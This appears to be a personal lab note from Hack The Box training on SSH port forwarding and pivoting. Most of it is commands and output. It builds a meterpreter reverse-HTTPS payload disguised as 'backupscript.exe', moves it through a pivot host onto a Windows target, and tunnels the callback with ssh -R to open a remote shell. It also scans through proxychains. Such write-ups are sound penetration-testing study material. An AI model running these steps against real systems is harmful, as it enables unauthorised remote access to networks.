---
title: Reverse Port Forwarding w SSH
draft: false
tags:
  - reverse-port-forwarding
---
**Local Port Forwarding** is where SSH can listen on our local host and forward a service on the remote host to our port:

```shell-session
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```


**Dynamic Port Forwarding** is where we send packets to remote network via pivot host:

```shell-session
ssh -D 9050 ubuntu@10.129.202.64
```

```shell-session
jadu101@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

```shell-session
proxychains nmap -v -Pn -sT 172.16.5.19
```

Sometimes we might want to forward local service to the remote port as well and we need **Reverse Port Forwarding** for this. 

## Setup

Attack Host(10.10.15.5) -> Ubuntu Server(10.129.15.50,172.16.5.129) -> Windows Server(172.16.5.19)

In this case, it would be impossible to get a reverse shell from Windows Server to Attack host since Windows server doesn't know how to route traffic leaving it's network. 

We have make Ubuntu server the pivot host to spawn a reverse shell. 

1. Create msfvenom payload with receiver set as Ubuntu Server(172.16.5.129)
2. Ubuntu port 8080 forwards all reverse packets to attacker's port 8000.


## Create Payload

We will create a payload using msfvenom with receiver set as the pivot host and listening port as 8080:

```shell-session
jadu101@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

## Transfer Payload to PivotHost

We will now transfer the payload to the pivot host(ubuntu server)

```shell-session
jadu101@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe   
```

## Transfer Payload to Target

Now let's transfer payload from PivotHost to Target machine(windows).


Python web server on PivotHost:

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

We will download the payload to the target:

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## Forwarding

We now have our payload on the Windows host. 

Let's use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our listener on port 8000.

```shell-session
jadu101@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

`-R` command asks the Ubuntu server to listen on port 8080 and forward all incoming connection to the attacker's port 8000. 

On metasploit, we now have the connection made once the payload runs:


```shell-session
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Below is the summary:

- Create payload for PivotHost-Target
- Transfer the payload to target
- SSH forward traffic to attacker listener port
- Run the payload on the target
- Shell

